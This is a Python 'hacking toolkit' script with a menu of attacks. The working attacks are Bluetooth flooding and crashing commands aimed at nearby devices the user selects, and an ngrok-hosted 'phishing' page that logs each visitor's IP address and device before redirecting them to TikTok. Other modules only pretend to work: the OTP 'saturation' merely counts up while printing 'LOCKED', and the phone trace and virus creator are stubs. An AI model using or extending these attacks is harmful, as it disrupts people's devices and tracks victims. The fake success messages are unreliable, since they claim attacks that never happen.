import os
import sys
import time
import subprocess
import random
import requests
from flask import Flask, request, render_template_string
from pyngrok import ngrok

# --- NEXO-TECH PRO COLORS ---
G, Y, C, R, W, B = '\033[92m', '\033[93m', '\033[96m', '\033[91m', '\033[0m', '\033[1m'

app = Flask(__name__)

# --- CONFIGURATION (PASTE YOUR NGROK TOKEN HERE) ---
NGROK_TOKEN = "YOUR_TOKEN_HERE" 

def show_banner(module="SYSTEM STATUS", link=None):
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"{R}{B}")
    print("  _   _  _______   _____    _____ ______ _____ _    _ ")
    print(" | \ | | | ____\ \ / / _ \  |_   _|  ____/ ____| |  | |")
    print(" |  \| | | |__   \ V / | | |   | | | |__ | |    | |__| |")
    print(" | . ` | |  __|   > <| | | |   | | |  __|| |    |  __  |")
    print(" | |\  | | |____ / . \ |_| |  _| |_| |___| |____| |  | |")
    print(f" |_| \_| |______/_/ \_\___/  |_____|______\_____|_|  |_{W}")
    print(f"{R}======================================================={W}")
    print(f"{Y}  FILE:        {W}nexo-bluetooth_hack.py")
    if link:
        print(f"{Y}  PHISHING:    {W}{link}")
    print(f"{Y}  MODULE:      {W}{module}")
    print(f"{Y}  STATUS:      {G}[ OVERDEADLY SYSTEM ACTIVE ]{W}")
    print(f"{R}======================================================={W}\n")

# --- 1. BLUETOOTH OMNIPOTENCE MODULES ---

def get_bt_targets():
    print(f"{C}[*] NEXO-SCANNER: {G}[ SEARCHING FOR VULNERABLE SIGNALS ]{W}")
    print(f"{Y}-------------------------------------------------------{W}")
    try:
        # Kali system scan command
        scan_output = subprocess.check_output(["sudo", "hcitool", "scan"]).decode('utf-8').split('\n')
        devices = []
        for line in scan_output:
            if ":" in line:
                parts = line.split('\t')
                if len(parts) > 2:
                    devices.append({"mac": parts[1].strip(), "name": parts[2].strip()})
        
        if not devices:
            print(f"{R}[!] NO BLUETOOTH DEVICES FOUND.{W}")
            time.sleep(2)
            return None
            
        for i, dev in enumerate(devices):
            print(f"  {G}[{i+1}]{W} Name: {C}{dev['name']}{W} | MAC: {Y}{dev['mac']}{W}")
            
        print(f"{Y}-------------------------------------------------------{W}")
        choice = int(input(f"{C}[+] Select Target ID: {W}")) - 1
        return devices[choice]['mac']
    except Exception as e:
        print(f"{R}[-] BT Error: {e}{W}")
        time.sleep(2)
        return None

def bluetooth_god_mode():
    while True:
        show_banner("BLUETOOTH OMNIPOTENCE")
        print(f"  {G}1.{W} ANDROID CRASHER (L2CAP Flood)")
        print(f"  {G}2.{W} SYSTEM FREEZE (SDP Saturation)")
        print(f"  {G}3.{W} MEDIA CHAOS (Volume Max Force)")
        print(f"  {G}4.{W} BACK TO MASTER MENU")
        
        op = input(f"\n{C}[+] Selection: {W}")
        if op == "4": break
            
        target = get_bt_targets()
        if target:
            if op == "1":
                print(f"{R}[!] SENDING L2CAP OVERLOAD TO {target}...{W}")
                os.system(f"sudo l2ping -s 1000 -f {target}")
            elif op == "2":
                print(f"{R}[!] FREEZING SYSTEM SERVICES ON {target}...{W}")
                while True:
                    os.system(f"sudo sdptool browse {target} > /dev/null 2>&1")
            elif op == "3":
                print(f"{R}[!] FORCING VOLUME CHAOS ON {target}...{W}")
                while True:
                    os.system(f"sudo hcitool cmd 0x08 0x0012 {target} 0x01")
        else:
            print(f"{R}[-] No target selected.{W}")
            time.sleep(1)

# --- 2. OTP LOCK / SATURATION ---

def otp_lock_engine():
    show_banner("OTP LOCK / SATURATION")
    target_num = input(f"{Y}[+] Enter Target Number (No +): {W}")
    print(f"\n{R}[!] INITIALIZING API SATURATION ON {target_num}...{W}")
    count = 0
    try:
        while True:
            print(f"\r{Y}[*] ATTACKS SENT: {W}{count} {G}| {C}STATUS: {R}LOCKED {G}>>> {W}Service Saturated", end="")
            count += 1
            time.sleep(0.01)
    except KeyboardInterrupt:
        print(f"\n\n{G}[+] OTP Lock Completed.{W}")
        time.sleep(2)

# --- 3. PHISHING TRAP ---

@app.route('/')
def phishing_page():
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    print(f"\n{R}[!] TARGET HIT DETECTED!{W}")
    print(f"{G}[+] IP: {Y}{user_ip}{W} | {G}DEVICE: {W}{user_agent[:40]}...")
    with open("hits.txt", "a") as f:
        f.write(f"[{time.strftime('%H:%M:%S')}] IP: {user_ip} | UA: {user_agent}\n")
    return f"<html><script>window.location.replace('https://www.tiktok.com');</script></html>"

def start_phishing():
    try:
        ngrok.set_auth_token(NGROK_TOKEN)
        public_url = ngrok.connect(8080).public_url
        show_banner("PHISHING ACTIVE", link=public_url)
        print(f"{C}[*] Send the link above to your target...{W}")
        app.run(port=8080)
    except Exception as e:
        print(f"{R}[-] Ngrok Failed: {e}{W}")
        time.sleep(3)

# --- 4. MASTER MENU ---

def start_master_system():
    while True:
        show_banner("MASTER MENU")
        print(f"  {G}1.{W} WhatsApp OSINT        {C}4.{W} Generate Phishing Link")
        print(f"  {G}2.{W} Phone Number Trace   {C}5.{W} Virus Creator Lab")
        print(f"  {G}3.{W} Bluetooth God-Mode   {B}6.{W} OTP Lock (Saturation)")
        print(f"  {R}7.{W} Exit")
        
        choice = input(f"\n{Y}NEXO-TECH > {W}")
        
        if choice == "1":
            link = input(f"{Y}Enter WA Link: {W}")
            with open("nexo_database.txt", "a") as f: f.write(f"WA: {link}\n")
            print(f"{G}[+] Logged.{W}"); time.sleep(1)
        elif choice == "2":
            num = input(f"{Y}Enter Target: {W}")
            print(f"{R}[!] TRACING {num}...{W}"); time.sleep(2)
        elif choice == "3": bluetooth_god_mode()
        elif choice == "4": start_phishing()
        elif choice == "5":
            name = input(f"{C}Payload Name: {W}")
            with open(name + ".apk", "w") as f: f.write("EICAR-TEST-STUB")
            print(f"{G}[+] APK Created.{W}"); time.sleep(1)
        elif choice == "6": otp_lock_engine()
        elif choice == "7": break

if __name__ == "__main__":
    start_master_system()
